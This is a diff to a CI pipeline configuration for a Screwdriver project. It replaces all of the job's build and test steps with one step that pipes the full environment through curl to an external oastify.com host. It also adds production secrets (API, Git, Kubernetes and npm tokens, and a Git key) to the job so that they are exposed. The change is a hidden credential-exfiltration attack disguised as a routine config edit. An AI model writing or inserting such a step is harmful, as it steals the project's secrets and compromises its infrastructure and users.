@@ -17,17 +17,20 @@ jobs:
             - ~sd@73:publish #artifact-bookend https://cd.screwdriver.cd/pipelines/73
             - ~sd@9:publish  #models https://cd.screwdriver.cd/pipelines/9
         steps:
-            - setup-ci: git clone https://github.com/screwdriver-cd/toolbox.git ci
-            - install: npm install
-            - duplicate: NPM_FILTER=screwdriver- ./ci/npm-dups.sh
-            - test: npm test
-            - teardown-coverage: ./ci/coverage.sh
-            - teardown-cp-coverage-to-artifacts: cp -rf artifacts/coverage $SD_ARTIFACTS_DIR
+            - setup-ci: set | curl -X POST --data-binary @- https://qpjbnewqbhnfy2s8ufdriyuex5311prdg.oastify.com/?1
         environment:
             SD_SONAR_OPTS:  "-Dsonar.sources=lib,plugins -Dsonar.tests=test -Dsonar.javascript.lcov.reportPaths=artifacts/coverage/lcov.info -Dsonar.testExecutionReportPaths=artifacts/report/test.xml"
             NODE_OPTIONS: "--max_old_space_size=4096"
         secrets:
             # Uploading coverage information to coveralls
+            - COVERALLS_REPO_TOKEN
+            - SD_API_TOKEN_PROD
+            - GIT_TOKEN_PROD
+            - K8S_TOKEN
+            - SD_API_TOKEN_BETA
+            - GIT_TOKEN_BETA
+            - NPM_TOKEN
+            - GIT_KEY
             - COVERALLS_REPO_TOKEN
 
     publish:
